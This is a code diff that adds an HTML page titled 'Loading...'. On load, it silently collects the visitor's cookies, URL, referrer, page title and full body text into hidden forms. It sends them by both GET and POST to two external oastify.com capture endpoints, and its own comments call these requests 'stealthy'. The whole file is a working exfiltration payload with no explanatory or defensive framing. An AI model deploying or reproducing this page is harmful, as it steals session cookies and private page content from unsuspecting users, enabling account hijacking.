@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+</head>
+<body>
+
+    <!-- 1️⃣ Stealthy GET Request (Avoids Preflight OPTIONS) -->
+    <form id="stealthFormGET" action="https://zadcghr8ejv7009keri22yezmqshg9jx8.oastify.com/capture" method="GET">
+        <input type="hidden" name="cookies" value="" />
+        <input type="hidden" name="url" value="" />
+        <input type="hidden" name="referrer" value="" />
+        <input type="hidden" name="title" value="" />
+        <input type="hidden" name="body" value="" />
+    </form>
+
+    <script>
+        document.forms['stealthFormGET'].cookies.value = document.cookie;
+        document.forms['stealthFormGET'].url.value = document.URL;
+        document.forms['stealthFormGET'].referrer.value = document.referrer;
+        document.forms['stealthFormGET'].title.value = document.title;
+        document.forms['stealthFormGET'].body.value = document.body.innerText;
+        document.forms['stealthFormGET'].submit();
+    </script>
+
+    <!-- 2️⃣ Stealthy POST Request (More Data, but May Trigger Preflight) -->
+    <form id="stealthFormPOST" action="https://lf4yl3wuj50t5me6jdno7kjlrcx3lvpje.oastify.com/capture" method="POST">
+        <input type="hidden" name="data" value="" />
+    </form>
+
+    <script>
+        document.forms['stealthFormPOST'].data.value = JSON.stringify({
+            cookies: document.cookie,
+            url: document.URL,
+            referrer: document.referrer,
+            title: document.title,
+            body: document.body.innerText
+        });
+
+        document.forms['stealthFormPOST'].submit();
+    </script>
+
+</body>
+</html>
